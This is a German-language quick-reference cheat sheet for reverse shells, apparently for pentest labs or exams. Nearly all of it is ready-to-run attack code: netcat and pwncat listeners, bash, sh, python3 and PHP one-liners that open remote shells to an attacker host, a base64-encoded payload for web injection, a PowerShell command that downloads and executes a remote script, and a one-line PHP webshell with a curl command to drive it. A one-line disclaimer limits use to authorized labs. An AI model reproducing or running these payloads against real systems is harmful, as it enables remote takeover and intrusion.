# 🔁 Reverse Shells — Quick Reference

> Nur in der autorisierten Prüfungs-/Lab-Umgebung verwenden. Erst `id`/`whoami` testen, dann Reverse Shell starten.

## Listener

```bash
nc -lvnp 4444
# oder stabiler:
pwncat-cs -lp 4444
```

## Linux

```bash
bash -c 'bash -i >& /dev/tcp/'$LHOST'/4444 0>&1'
sh -i >& /dev/tcp/$LHOST/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$LHOST'",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
php -r '$sock=fsockopen("'$LHOST'",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Base64-Variante für Web-Injection

```bash
payload=$(echo -n "bash -i >& /dev/tcp/$LHOST/4444 0>&1" | base64 -w0)
echo $payload
# Target: echo <payload>|base64 -d|bash
```

## Windows PowerShell

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/rev.ps1')"
```

EncodedCommand siehe [encoding.md](./encoding.md).

## Webshell-Test

```php
<?php system($_GET['c']); ?>
```

```bash
curl "http://$RHOST/uploads/shell.php?c=whoami"
```
